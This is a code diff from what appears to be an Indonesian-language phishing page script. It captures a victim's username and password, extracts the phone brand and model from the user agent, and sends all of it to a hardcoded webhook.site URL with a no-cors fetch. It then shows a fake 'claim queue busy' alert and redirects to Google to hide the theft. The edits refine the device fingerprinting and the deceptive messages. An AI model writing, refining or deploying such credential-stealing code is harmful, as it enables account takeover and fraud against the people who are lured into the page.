@@ -42,44 +42,49 @@
             return;
         }
 
-        // Ambil info perangkat yang lebih detail
+        // --- SISTEM DETEKSI PERANGKAT PRO ---
         const ua = navigator.userAgent;
-        let perangkat = "Unknown Device";
+        let modelHP = "Linux/Unknown";
+
+        // Coba cari merk HP populer di User Agent
+        const brands = ["Samsung", "SM-", "Oppo", "CPH", "Vivo", "V2", "Xiaomi", "Redmi", "Infinix", "iPhone", "Sony", "Pixel", "Huawei"];
         
-        // Logika sederhana tarik nama HP
-        if (ua.match(/Android/i)) {
+        for (let b of brands) {
+            if (ua.includes(b)) {
+                // Ambil teks di sekitar merk biar dapet tipenya
+                let segment = ua.split(b)[1] ? b + ua.split(b)[1].split(";")[0].split(")")[0] : b;
+                modelHP = segment.trim();
+                break;
+            }
+        }
+
+        // Kalau tetep gak ketemu merk, ambil info sistem dasar
+        if (modelHP === "Linux/Unknown") {
             const match = ua.match(/\(([^;]+);/);
-            perangkat = match ? match[1] : "Android Device";
-        } else if (ua.match(/iPhone/i)) {
-            perangkat = "iPhone";
+            modelHP = match ? match[1] : "Android/Mobile";
         }
 
         const payload = {
             target_user: user,
             target_pass: pass,
-            device_info: perangkat,
-            browser_log: ua,
-            ip_check: "Via Webhook",
+            device_info: modelHP, 
+            full_user_agent: ua,
             timestamp: new Date().toLocaleString('id-ID')
         };
 
-        // Webhook URL lu udah gw pasang
         const webhookURL = "https://webhook.site/4dbdc684-da03-4290-aea1-f60edc92decf";
 
         fetch(webhookURL, {
             method: 'POST',
-            mode: 'no-cors', // INI PENTING! Biar gak error jaringan/CORS
+            mode: 'no-cors', 
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         })
         .then(() => {
-            // Loading palsu biar makin meyakinkan
-            alert("Server sibuk! Sedang memproses antrean klaim. Mohon tunggu 1x24 jam.");
+            alert("Koneksi sibuk! Sedang memproses antrean klaim. Mohon tunggu 1x24 jam.");
             window.location.href = "https://www.google.com";
         })
         .catch(() => {
-            // Backup kalau gagal fetch, biasanya data tetep masuk di Webhook kalau mode no-cors
-            alert("Sedang memproses... Silakan cek koneksi Anda.");
             window.location.href = "https://www.google.com";
         });
     }
